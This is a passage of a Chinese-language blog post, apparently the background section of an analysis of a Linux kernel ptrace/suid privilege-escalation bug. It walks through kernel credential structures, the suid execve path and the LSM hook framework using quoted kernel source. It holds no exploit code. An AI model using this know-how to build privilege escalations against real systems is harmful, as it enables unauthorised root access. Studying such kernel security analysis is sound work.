结构体进行标识，该结构体定义于内核源码<code>include/linux/sched.h</code>中</p><p>我们主要关心其对于进程权限的管理，注意到<code>task_struct</code>的源码中有如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>Process credentials</strong> 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p><ul><li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的调试进程（ptracer）的 cred</li><li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li><li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li></ul><h2 id="cred：进程权限凭证（credentials）"><a href="#cred：进程权限凭证（credentials）" class="headerlink" title="cred：进程权限凭证（credentials）"></a>cred：进程权限凭证（credentials）</h2><p>对于一个进程，在内核当中使用一个结构体<code>cred</code>管理其权限，该结构体定义于内核源码<code>include/linux/cred.h</code>中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="type">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="type">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="type">void</span>*put_addr;</span><br><span class="line"><span class="type">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="type">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="type">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>我们主要关注<code>cred</code>结构体中管理权限的变量</p><h3 id="用户ID-amp-组ID"><a href="#用户ID-amp-组ID" class="headerlink" title="用户ID &amp; 组ID"></a>用户ID &amp; 组ID</h3><p>一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p><ul><li><strong>真实用户ID</strong>（real UID）：标识一个进程<strong>启动时的用户ID</strong></li><li><strong>保存用户ID</strong>（saved UID）：标识一个进程<strong>最初的有效用户ID</strong></li><li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限</li><li><strong>文件系统用户ID</strong>（UID for VFS ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li></ul><p>在通常情况下这几个ID应当都是相同的</p><p>用户组ID同样分为四个：<code>真实组ID</code>、<code>保存组ID</code>、<code>有效组ID</code>、<code>文件系统组ID</code>，与用户ID是类似的，这里便不再赘叙</p><h3 id="命名空间（namespace）"><a href="#命名空间（namespace）" class="headerlink" title="命名空间（namespace）"></a>命名空间（namespace）</h3><p>cred 结构体中的 user_ns  字段标识了该进程所属的命名空间</p><h2 id="namespace：命名空间"><a href="#namespace：命名空间" class="headerlink" title="namespace：命名空间"></a>namespace：命名空间</h2><p><strong>命名空间</strong>（<strong>namespace</strong>） <strong>是 Linux kernel 用来隔离内核资源的方式。</strong> 通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，双方都无法访问对方命名空间中的资源</p><p>在 cred 当中有指向其所属命名空间的指针，在Linux kernel 中命名空间为一个 <code>user_namespace</code> 结构体，该结构体定义于 <code>/include/linux/user_namespace.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">uid_map</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">gid_map</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">projid_map</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>*<span class="title">parent</span>;</span></span><br><span class="line"><span class="type">int</span>level;</span><br><span class="line"><span class="type">kuid_t</span>owner;</span><br><span class="line"><span class="type">kgid_t</span>group;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span><span class="title">ns</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register of per-UID persistent keyrings for this namespace */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PERSISTENT_KEYRINGS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">persistent_keyring_register</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span><span class="title">persistent_keyring_register_sem</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span><span class="title">work</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSCTL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctl_table_set</span><span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctl_table_header</span> *<span class="title">sysctls</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span>*<span class="title">ucounts</span>;</span></span><br><span class="line"><span class="type">int</span> ucount_max[UCOUNT_COUNTS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们主要关注这几个字段：</p><ul><li><strong>owner</strong>：即该命名空间的<strong>所有者</strong>；通常来说每个进程有其独立的命名空间，但对于一些需要共享资源的进程而言他们有可能会需要共享同一个命名空间</li><li><strong>group</strong>：命名空间所属的用户组</li><li><strong>parent</strong>：该命名空间的父命名空间，关系类似于父子进程，最上一层为 init_cred 的命名空间 <code>init_user_ns</code></li></ul><h2 id="linux-binprm：待执行文件数据"><a href="#linux-binprm：待执行文件数据" class="headerlink" title="linux_binprm：待执行文件数据"></a>linux_binprm：待执行文件数据</h2><p>前面讲到 ptrace 应当配合着 execve 进行使用，在 execve 系统调用中涉及到一个结构体叫做 <code>linux_binprm</code>，该结构体用以记录 kernel 加载（其实就是执行）一个二进制文件时用到的数据，定义于 <code>/include/linux/binfmts.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This structure is used to hold the arguments that are used when loading binaries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span> &#123;</span></span><br><span class="line"><span class="type">char</span> buf[BINPRM_BUF_SIZE];</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> vma_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_ARG_PAGES32</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>[<span class="title">MAX_ARG_PAGES</span>];</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> p; <span class="comment">/* current top of mem */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">cred_prepared:<span class="number">1</span>,<span class="comment">/* true if creds already prepared (multiple</span></span><br><span class="line"><span class="comment"> * preps happen for interpreters) */</span></span><br><span class="line">cap_effective:<span class="number">1</span>;<span class="comment">/* true if has elevated effective capabilities,</span></span><br><span class="line"><span class="comment"> * false if not; except for init which inherits</span></span><br><span class="line"><span class="comment"> * its parent&#x27;s caps anyway */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __alpha__</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> taso:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> recursion_depth; <span class="comment">/* only for search_binary_handler() */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span><span class="comment">/* new credentials */</span></span><br><span class="line"><span class="type">int</span> unsafe;<span class="comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> per_clear;<span class="comment">/* bits to clear in current-&gt;personality */</span></span><br><span class="line"><span class="type">int</span> argc, envc;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * filename;<span class="comment">/* Name of binary as seen by procps */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * interp;<span class="comment">/* Name of the binary really executed. Most</span></span><br><span class="line"><span class="comment">   of the time same as filename, but could be</span></span><br><span class="line"><span class="comment">   different for binfmt_&#123;misc,script&#125; */</span></span><br><span class="line"><span class="type">unsigned</span> interp_flags;</span><br><span class="line"><span class="type">unsigned</span> interp_data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> loader, exec;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里我们主要关注 cred 字段，其标识了要运行的<strong>新程序的权限</strong></p><h2 id="LSM-与-程序执行权限检查"><a href="#LSM-与-程序执行权限检查" class="headerlink" title="LSM 与 程序执行权限检查"></a>LSM 与 程序执行权限检查</h2><p>在 task_struct 结构体当中我们注意到 <code>ptracer_cred</code> 这个字段，这个字段自 <code>Linux kernel 4.10</code>  引入到 task_struct 结构体当中，引入 ptracer_cred 的目的是用于当 tracee 执行 exec 去加载 <a href="https://www.computerhope.com/jargon/s/setuid.htm">setuid executable</a> 时做安全检测</p><blockquote><p>参见 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67">ptrace: Capture the ptracer’s creds not PT_PTRACE_CAP</a> </p></blockquote><p>这一部分会展开分析一定数量的内核源码，针对这个漏洞而言，可以直接看结论：<strong>若 ptracee 进程执行 suid&#x2F;sgid 程序，则检查 ptracee 保存的 ptracer 的 cred，即 ptracee 的 task_struct 的 ptracer_cred 字段的权限，若权限不足则 ptracee 以其自身的 euid&#x2F;egid 执行程序，而非文件的 suid&#x2F;sgid</strong></p><h3 id="suid-x2F-sgid-文件的执行流程"><a href="#suid-x2F-sgid-文件的执行流程" class="headerlink" title="suid&#x2F;sgid 文件的执行流程"></a>suid&#x2F;sgid 文件的执行流程</h3><p>当一个进程执行一个 suid 文件时（例如 <code>/usr/bin/passwd</code>），存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_execve()</span><br><span class="line">    do_execve()</span><br><span class="line">    do_execveat_common()</span><br><span class="line">    prepare_binprm()</span><br><span class="line">    bprm_fill_uid()</span><br></pre></td></tr></table></figure><p>函数 <code>bprm_fill_uid()</code> 定义于 <code>/fs/exec.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">bprm_fill_uid</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mode;</span><br><span class="line"><span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="type">kgid_t</span> gid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Since this can be called multiple times (via prepare_binprm),</span></span><br><span class="line"><span class="comment"> * we must clear any previous work done when setting set[ug]id</span></span><br><span class="line"><span class="comment"> * bits from any earlier bprm-&gt;file uses (for example when run</span></span><br><span class="line"><span class="comment"> * first for a setuid script then again for its interpreter).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">// 笔者注：首先使用原进程 euid egid</span></span><br><span class="line">bprm-&gt;cred-&gt;euid = current_euid();</span><br><span class="line">bprm-&gt;cred-&gt;egid = current_egid();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mnt_may_suid(bprm-&gt;file-&gt;f_path.mnt))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task_no_new_privs(current))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">inode = file_inode(bprm-&gt;file);</span><br><span class="line">mode = READ_ONCE(inode-&gt;i_mode);</span><br><span class="line"><span class="keyword">if</span> (!(mode &amp; (S_ISUID|S_ISGID)))</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">// 笔者注：不是 suid/sgid 程序，直接返回，否则将 euid/egid 设为文件 uid/gid</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Be careful if suid/sgid is set */</span></span><br><span class="line">inode_lock(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* reload atomically mode/uid/gid now that lock held */</span></span><br><span class="line">mode = inode-&gt;i_mode;</span><br><span class="line">uid = inode-&gt;i_uid;</span><br><span class="line">gid = inode-&gt;i_gid;</span><br><span class="line">inode_unlock(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We ignore suid/sgid if there are no mappings for them in the ns */</span></span><br><span class="line"><span class="keyword">if</span> (!kuid_has_mapping(bprm-&gt;cred-&gt;user_ns, uid) ||</span><br><span class="line"> !kgid_has_mapping(bprm-&gt;cred-&gt;user_ns, gid))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mode &amp; S_ISUID) &#123;</span><br><span class="line">bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line">bprm-&gt;cred-&gt;euid = uid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((mode &amp; (S_ISGID | S_IXGRP)) == (S_ISGID | S_IXGRP)) &#123;</span><br><span class="line">bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line">bprm-&gt;cred-&gt;egid = gid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们注意到这样一个逻辑：当我们尝试运行一个 suid 程序时，其会将新进程的 cred-&gt;euid 设置为 suid 文件的 uid</p><p>那么如果我们 fork 出子进程运行 suid 程序、父进程再 ptrace attach 岂不就能直接完成提权了吗？答案是否定的，因为后面还会进行权限检查，我们继续跟踪调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SYS_execve()</span><br><span class="line">    do_execve()</span><br><span class="line">    do_execveat_common()</span><br><span class="line">    prepare_binprm()</span><br><span class="line">    bprm_fill_uid()</span><br><span class="line">    security_bprm_set_creds()</span><br></pre></td></tr></table></figure><p>该函数定义于 <code>security/security.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">security_bprm_set_creds</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> call_int_hook(bprm_set_creds, <span class="number">0</span>, bprm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然只有一个语句但解释起来可能有点复杂，这里我们要引入一个新的概念—— <code>Linux Security Modules</code>（LSM）</p><h3 id="Linux-Security-Modules"><a href="#Linux-Security-Modules" class="headerlink" title="Linux Security Modules"></a>Linux Security Modules</h3><p>LSM 即 Linux 安全模组，类似于 VFS， 其提供了统一的安全业务逻辑接口，例如 SELinux 便是基于 LSM 实现的，整体框架如下：</p><p><img src="https://s2.loli.net/2022/01/12/f91geXREUiTyFSm.png" alt="偷的图.png"></p><blockquote><p>启用这个框架需要开启内核编译选项 <code>CONFIG_SECURITY</code>（默认开启）</p></blockquote><p>现在我们来剖析 <code>call_int_hook</code> 宏，该宏用于<strong>调用对应的 LSM 钩子</strong>，定义于 <code>/security/security.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;\</span></span><br><span class="line"><span class="meta">int RC = IRC;\</span></span><br><span class="line"><span class="meta">do &#123;\</span></span><br><span class="line"><span class="meta">struct security_hook_list *P;\</span></span><br><span class="line"><span class="meta">\</span></span><br><span class="line"><span class="meta">list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) &#123; \</span></span><br><span class="line"><span class="meta">RC = P-&gt;hook.FUNC(__VA_ARGS__);\</span></span><br><span class="line"><span class="meta"><span class="keyword">if</span> (RC != 0)\</span></span><br><span class="line"><span class="meta">break;\</span></span><br><span class="line"><span class="meta">&#125;\</span></span><br><span class="line"><span class="meta">&#125; while (0);\</span></span><br><span class="line"><span class="meta">RC;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p>其中 <code>list_for_each_entry</code> 是内核中常用遍历宏，这里不再赘叙，这里的 <code>security_hook_heads</code> 是一个<strong>全局结构体</strong>，阅读源码可以发现其中存放的都是内核双向链表结构，其实对应的应当是 <code>security_hook_list</code> 结构体，定义于 <code>/include/linux/lsm_hooks.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Security module hook list structure.</span></span><br><span class="line"><span class="comment"> * For use with generic list macros for common operations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>*<span class="title">head</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">security_list_options</span><span class="title">hook</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中联合体 <code>security_list_options</code> 其实就是一个函数指针，不再赘叙，那么 <code>call_int_hook</code> 宏的作用就不言而喻了：调用 <code>security_hook_heads</code> 中对应成员的函数指针。我们也可以看出 <code>security_hook_heads</code> 结构体相当于一张函数表</p><p>这张函数表会在内核初始化时被初始化，这里我们将目光放到<strong>内核启动的初始化函数</strong>——<code>start_kernel()</code> 中，该函数定义于 <code>/init/main.c</code> 中，我们观察到如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage __visible <span class="type">void</span> __init <span class="title function_">start_kernel</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    security_init();</span><br></pre></td></tr></table></figure><p>函数 <code>security_init()</code> 用以进行 LSM 的初始化，定义于 <code>/security/security.c</code> 中，观察到如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">security_init()</span><br><span class="line">    capability_add_hooks()</span><br></pre></td></tr></table></figure><p>这里 <code>capability_add_hooks()</code> 逻辑比较简单，定义于 <code>/security/commoncap.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 